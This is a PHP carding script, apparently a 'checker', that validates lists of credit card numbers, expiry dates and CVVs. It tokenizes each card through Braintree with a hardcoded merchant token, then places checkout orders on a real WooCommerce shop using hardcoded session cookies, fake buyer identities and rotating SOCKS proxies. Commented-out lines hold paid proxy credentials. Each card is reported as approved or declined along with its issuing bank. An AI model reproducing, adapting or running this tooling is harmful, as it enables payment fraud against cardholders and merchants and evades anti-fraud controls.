<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
// $lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
// $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz",999)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz",999)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);

// echo $counters2;


function updatecart(){


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: wordpress_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C73b56130f108e7166ee0fff069ff4e84d70d9d11c3aa02ca543c9ae2db58462e; __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}',
'origin: https://airstreamsupplycompany.com',
'referer: https://airstreamsupplycompany.com/products/interstate-carabiner-d-style-keychain',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=woocommerce_add_to_cart&product_id=6449&quantity=1&nonce=acdd747418');

}
$update = curl_exec($ch);

$hash = trim(strip_tags(getstr($update,'"cart_hash":"','"')));

//============================================================================================================================================================
 // Request 1


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
# Uncomment the upper two lines if you have filled the upper login details
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE3MjEyNTQsImp0aSI6IjIzZWVjMDk2LWY0MzctNGU1Yy1hZmFlLWVmYTk2ZDc4ZjkzNyIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.MMwdScuyL1rdcEuTPKNOIdM11O8Lv1ccrIpbnwiX8UXBPCIdfdKAIIvvTFeayz95sJVpQPwCdQf_KbcD7zjzgQ',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://payments.braintree-api.com/',
'user-agent: '.$browser.''
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"99efceff-a43b-4a66-9704-e6706b41ae34"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$b_pago = curl_exec($ch);

curl_close($ch);

   // echo $b_pago;
$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
$issuebank = trim(strip_tags(getstr($b_pago,'"bank": "','"')));
$issuecountry = trim(strip_tags(getstr($b_pago,'"country": "','"')));
$type = trim(strip_tags(getstr($b_pago,'"financing": "','"')));
$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/?wc-ajax=checkout');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
'origin: https://airstreamsupplycompany.com',
'referer: https://airstreamsupplycompany.com/checkout/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=5182641524&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=71003ee62d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com');

// // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"bfwc_checkout_error\" value=\"true\" \/>"')));
//  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
//  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));


// //////////////////////// BIN INFO ////////////////////////////////

// /////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"result":"success"')){
  updatecart();

      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat-'.$category.'</font></b></font></td></tr>';

   }
elseif(strpos($result,'Too Many Attempts.')){
         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [TOO MANY TRIES]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
   }
else {


         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';

}

curl_close($curl);
ob_flush();
       // echo $result;
//echo $browser;
?>
